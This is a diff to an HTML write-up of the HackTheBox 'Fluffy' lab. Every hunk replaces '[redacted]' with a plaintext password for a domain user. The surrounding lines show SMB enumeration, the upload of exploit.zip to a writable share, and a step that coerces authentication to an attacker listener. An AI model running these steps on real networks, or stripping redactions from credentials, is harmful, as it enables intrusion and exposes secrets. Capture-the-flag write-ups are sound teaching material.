@@ -95,7 +95,7 @@
       <h2>Environment &amp; Scope</h2>
 
       <p>Fluffy exposes a single Windows Domain Controller externally. The provided credential
-        <code>j.fleischman:[redacted]</code> is not a shell by itself, but it is enough to enumerate
+        <code>j.fleischman:J0elTHEM4n1990!</code> is not a shell by itself, but it is enough to enumerate
         SMB shares and write to the <code>IT</code> share. That share is the opening. It contains a PDF
         warning the IT department about several 2025 vulnerabilities, and one of them gives us a way
         to coerce a second domain user into authenticating to our SMB listener.
@@ -148,7 +148,7 @@
           <tbody>
             <tr>
               <td><code>j.fleischman</code></td>
-              <td><code>[redacted]</code></td>
+              <td><code>J0elTHEM4n1990!</code></td>
               <td>Plaintext</td>
               <td>Given credential</td>
             </tr>
@@ -230,7 +230,7 @@ Clock skew: +6h59m59s</code></pre>
         there can be consumed by another user or automated process.
       </div>
 
-      <pre><code>smbmap -H "10.129.31.202" -u "j.fleischman" -p '[redacted]'
+      <pre><code>smbmap -H "10.129.31.202" -u "j.fleischman" -p 'J0elTHEM4n1990!'
 
 <span class="good">[+] IP: 10.129.31.202:445 Name: fluffy.htb Status: Authenticated</span>
 Disk       Permissions   Comment
@@ -241,7 +241,7 @@ IT         READ, WRITE
 NETLOGON   READ ONLY     Logon server share
 SYSVOL     READ ONLY     Logon server share</code></pre>
 
-      <pre><code>smbclient //10.129.31.202/IT -U 'fluffy.htb/j.fleischman%[redacted]'
+      <pre><code>smbclient //10.129.31.202/IT -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!'
 
 smb: \> ls
   Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
@@ -351,7 +351,7 @@ Enter IP (EX: 192.168.1.162): 10.10.14.241
 <span class="good">completed</span></code></pre>
 
       <pre><code>smbclient //10.129.31.202/IT \
-  -U 'fluffy.htb/j.fleischman%[redacted]' \
+  -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' \
   -c 'put exploit.zip'
 
 <span class="good">putting file exploit.zip as \exploit.zip</span></code></pre>
@@ -822,7 +822,7 @@ PS C:\Users\Administrator\Desktop> type root.txt
         <pre><code>
   INITIAL CREDENTIAL
   ─────────────────────────────────────────────────────────────────────
-  j.fleischman:[redacted]
+  j.fleischman:J0elTHEM4n1990!
   SMB auth succeeds, no admin shares, IT share is READ/WRITE
        │
        ▼
